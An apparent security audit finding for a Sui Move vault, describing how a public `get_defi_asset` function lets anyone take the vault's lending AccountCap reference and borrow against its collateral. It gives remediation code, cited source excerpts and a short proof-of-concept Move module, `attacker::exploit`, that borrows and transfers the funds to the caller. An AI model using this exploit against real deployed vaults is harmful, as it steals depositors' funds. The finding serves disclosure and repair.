# Audit Report

## Title
Unauthorized Lending Operations via Public AccountCap Reference Bypass Vault Operation Gating

## Summary
The vault's `get_defi_asset` function is public without access control, allowing anyone to obtain a reference to the vault's `NaviAccountCap` and use it with public `incentive_v3` lending functions to perform unauthorized borrow operations, bypassing OperatorCap authorization, vault status gating, and loss tolerance mechanisms. This enables direct theft of vault funds.

## Finding Description

The vulnerability stems from the `get_defi_asset` function being publicly accessible without any authorization or status checks. [1](#0-0) 

This function returns a reference to any asset in the vault's `assets` Bag, including the critical `NaviAccountCap` which represents the vault's lending protocol position. [2](#0-1) 

**Why Intended Protections Fail:**

The intended operation flow requires calling `start_op_with_bag` which enforces OperatorCap checks and vault status validation. [3](#0-2) 

During operations, the AccountCap is removed from the vault's assets bag via `borrow_defi_asset` (which is package-only). [4](#0-3) 

After operations, `end_op_with_bag` returns the AccountCap and enables value update checks. [5](#0-4) 

However, `get_defi_asset` bypasses all these protections. When the vault is in NORMAL status (not during an operation), the AccountCap remains in the vault's assets bag and can be accessed by anyone.

**Exploitation Path:**

An attacker deploys a custom Move module that:
1. Calls `get_defi_asset` to obtain an AccountCap reference
2. Calls `incentive_v3::borrow_with_account_cap` which is a PUBLIC function (not entry, but callable from modules) [6](#0-5) 
3. This function extracts the owner address from the AccountCap and borrows on behalf of that account [7](#0-6) 
4. The borrowed `Balance<CoinType>` is returned to the attacker's module, which converts it to `Coin` and transfers it

The debt is recorded against the vault's account in the Navi lending protocol, but the borrowed funds are stolen by the attacker.

## Impact Explanation

**Direct Fund Impact:**
- Attacker can borrow funds from the Navi lending protocol using the vault's collateral position
- The borrowed balance is returned to the attacker who can convert it to coin and transfer to themselves
- The vault's debt increases without corresponding asset acquisition or proper accounting
- Vault depositors suffer immediate losses as the vault's net position value decreases

**Security Integrity Bypass:**
- Completely bypasses OperatorCap authorization requirement enforced by the intended operation flow [8](#0-7) 
- Bypasses vault status gating between NORMAL and DURING_OPERATION states [9](#0-8) 
- Bypasses loss tolerance checks that occur in `end_op_value_update_with_bag` [10](#0-9) 
- Bypasses value update and health factor validation flows

**Quantified Impact:**
- An attacker can borrow up to the vault's available credit limit in the lending protocol
- If the vault has $1M in collateral with 75% LTV, an attacker could borrow approximately $750K worth of assets
- This could push the vault's health factor below liquidation threshold, causing total loss of collateral
- All vault depositors' shares would lose value proportional to the stolen/lost amount

## Likelihood Explanation

**Attacker Capabilities:**
- Must deploy a custom Move module (cannot use programmable transaction blocks due to public but non-entry functions)
- Requires no special privileges or capabilities beyond standard transaction sender
- All required objects (Vault, Storage, Pool, Incentive, Oracle, Clock) are shared objects and publicly accessible

**Attack Complexity:**
- LOW - A simple module with approximately 10 lines of code can execute the attack
- No timing constraints or race conditions required
- Attack works whenever vault is in NORMAL status, which is the majority of the time (not during active operations)

**Feasibility Conditions:**
- Vault must be in NORMAL status (not during an active operation) - this is the default state
- AccountCap must be in vault's assets bag (true when vault is not in operation)
- Lending protocol must have available liquidity to borrow (typically true)

**Economic Rationality:**
- Module deployment cost: negligible (one-time cost of ~0.1-1 SUI)
- Potential profit: up to vault's entire lending credit limit (potentially millions of dollars)
- Attack cost << potential profit, making it highly economically rational for any attacker

**Detection/Operational Constraints:**
- Attack leaves clear on-chain trail (unusual borrow transactions from vault's account)
- However, damage is instant and irreversible once executed
- No time for intervention before funds are stolen

## Recommendation

Add access control to `get_defi_asset` function to restrict it to package-only visibility:

```move
// Change from 'public fun' to 'public(package) fun'
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

Alternatively, add status checks and capability requirements:

```move
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    _cap: &OperatorCap,
    asset_type: String,
): &AssetType {
    self.check_version();
    self.assert_during_operation(); // Only allow during operations
    self.assets.borrow<String, AssetType>(asset_type)
}
```

## Proof of Concept

A malicious module would look like this:

```move
module attacker::exploit {
    use volo_vault::vault::Vault;
    use lending_core::account::AccountCap;
    use lending_core::incentive_v3;
    use sui::coin;
    
    public fun exploit<T, CoinType>(
        vault: &Vault<T>,
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        asset_type: String,
        ctx: &mut TxContext
    ) {
        // Step 1: Get reference to vault's AccountCap
        let account_cap_ref = vault.get_defi_asset<T, AccountCap>(asset_type);
        
        // Step 2: Borrow using vault's AccountCap
        let borrowed_balance = incentive_v3::borrow_with_account_cap<CoinType>(
            clock, oracle, storage, pool, asset, amount,
            incentive_v2, incentive_v3, account_cap_ref
        );
        
        // Step 3: Convert to coin and steal
        let stolen_coin = coin::from_balance(borrowed_balance, ctx);
        transfer::public_transfer(stolen_coin, tx_context::sender(ctx));
    }
}
```

The vault's debt increases in the Navi protocol while the attacker receives the borrowed funds, bypassing all intended protections.

### Citations

**File:** volo-vault/sources/volo_vault.move (L1415-1434)
```text
public(package) fun borrow_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
): AssetType {
    self.check_version();
    self.assert_enabled();

    assert!(contains_asset_type(self, asset_type), ERR_ASSET_TYPE_NOT_FOUND);

    if (self.status() == VAULT_DURING_OPERATION_STATUS) {
        self.op_value_update_record.asset_types_borrowed.push_back(asset_type);
    };

    emit(DefiAssetBorrowed {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.remove<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L1-10)
```text
module volo_vault::navi_adaptor;

use lending_core::account::AccountCap as NaviAccountCap;
use lending_core::dynamic_calculator;
use lending_core::storage::Storage;
use math::ray_math;
use std::ascii::String;
use sui::clock::Clock;
use volo_vault::vault::Vault;
use volo_vault::vault_oracle::{Self, OracleConfig};
```

**File:** volo-vault/sources/operation.move (L68-76)
```text
public(package) fun pre_vault_check<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    ctx: &TxContext,
) {
    // vault.assert_enabled();
    vault.assert_normal();
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
    vault.try_reset_tolerance(false, ctx);
}
```

**File:** volo-vault/sources/operation.move (L94-107)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);

```

**File:** volo-vault/sources/operation.move (L209-297)
```text
public fun end_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    mut defi_assets: Bag,
    tx: TxBag,
    principal_balance: Balance<T>,
    coin_type_asset_balance: Balance<CoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
    vault.assert_during_operation();

    let TxBag {
        vault_id,
        defi_asset_ids,
        defi_asset_types,
    } = tx;

    assert!(vault.vault_id() == vault_id, ERR_VAULT_ID_MISMATCH);

    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = defi_assets.remove<String, NaviAccountCap>(navi_asset_type);
            vault.return_defi_asset(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = defi_assets.remove<String, CetusPosition>(cetus_asset_type);
            vault.return_defi_asset(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = defi_assets.remove<String, SuilendObligationOwnerCap<ObligationType>>(
                suilend_asset_type,
            );
            vault.return_defi_asset(suilend_asset_type, obligation);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = defi_assets.remove<String, MomentumPosition>(
                momentum_asset_type,
            );
            vault.return_defi_asset(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = defi_assets.remove<String, Receipt>(receipt_asset_type);
            vault.return_defi_asset(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    emit(OperationEnded {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount: principal_balance.value(),
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount: coin_type_asset_balance.value(),
    });

    vault.return_free_principal(principal_balance);

    if (coin_type_asset_balance.value() > 0) {
        vault.return_coin_type_asset<T, CoinType>(coin_type_asset_balance);
    } else {
        coin_type_asset_balance.destroy_zero();
    };

    vault.enable_op_value_update();

    defi_assets.destroy_empty();
}
```

**File:** volo-vault/sources/operation.move (L299-377)
```text
public fun end_op_value_update_with_bag<T, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    tx: TxBagForCheckValueUpdate,
) {
    vault::assert_operator_not_freezed(operation, cap);
    vault.assert_during_operation();

    let TxBagForCheckValueUpdate {
        vault_id,
        defi_asset_ids,
        defi_asset_types,
        total_usd_value,
        total_shares,
    } = tx;

    assert!(vault.vault_id() == vault_id, ERR_VAULT_ID_MISMATCH);

    // First check if all assets has been returned
    let length = defi_asset_ids.length();
    let mut i = 0;
    while (i < length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            assert!(vault.contains_asset_type(navi_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(cetus_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let suilend_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            assert!(vault.contains_asset_type(suilend_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            assert!(vault.contains_asset_type(momentum_asset_type), ERR_ASSETS_NOT_RETURNED);
        };

        i = i + 1;
    };

    let total_usd_value_before = total_usd_value;
    vault.check_op_value_update_record();
    let total_usd_value_after = vault.get_total_usd_value(
        clock,
    );

    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };

    assert!(vault.total_shares() == total_shares, ERR_VERIFY_SHARE);

    emit(OperationValueUpdateChecked {
        vault_id: vault.vault_id(),
        total_usd_value_before,
        total_usd_value_after,
        loss,
    });

    vault.set_status(VAULT_NORMAL_STATUS);
    vault.clear_op_value_update_record();
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-945)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);

        deposit_borrow_fee(incentive_v3, &mut _balance, fee);

        _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L34-36)
```text
    public fun account_owner(cap: &AccountCap): address {
        cap.owner
    }
```
